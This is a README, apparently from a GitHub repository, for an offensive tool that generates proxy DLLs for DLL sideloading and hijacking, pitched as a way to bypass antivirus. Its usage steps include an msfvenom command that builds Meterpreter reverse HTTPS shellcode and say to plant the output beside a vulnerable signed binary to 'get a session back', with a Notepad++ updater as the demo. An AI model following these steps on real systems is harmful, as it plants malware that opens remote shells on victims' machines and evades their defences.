# SideLoadingDLL

Python script to generate "proxy" DLL files load unsafely by binaries on runtime, makes it super easy to perform a DLL Sideloading attack or hijacking.
This implementation makes sure that all system calls still go through ntdll.dll to avoid the usage of direct systemcalls.

See the below articles for more details
https://flangvik.com/privesc/windows/bypass/2019/06/25/Sideload-like-your-an-APT.html
https://flangvik.com/2019/07/24/Bypassing-AV-DLL-Side-Loading.html

demo's is using GUP.exe signed from NotePad++, loading a malicious libcurl sideloading malware:

Sideloading ncrypt.dll( meterpreter session)
![Meterpreter sideload](https://github.com/MaorSabag/SideLoadingDLL/blob/main/demo/screen-capture.gif)

## Dependencies
- x64 Native Tools Command Prompt for VS
- Python3

## Usage
- Find a binary that is vulnerable to SideLoading/DLL Hijacking
- Create a shellcode (msfvenom -p windows/x64/meterpreter_reverse_https LHOST=eth0 LPORT=443 -f raw -o shellcode.bin)
- Run the make.py file with the arguments needed
- Copy the files from the Output directory to the vulnerable program and make sure the injected process is open
- Run the program and get a session back!!


## Credits 
- [Sektor7's RTO Malware Essential Course](https://institute.sektor7.net/red-team-operator-malware-development-essentials)
- [Flangvik](https://twitter.com/Flangvik)'s [SharpDllProxy](https://github.com/Flangvik/SharpDllProxy)
- [thefLink](https://github.com/thefLink)'s [RecycledGate](https://github.com/thefLink/RecycledGate)
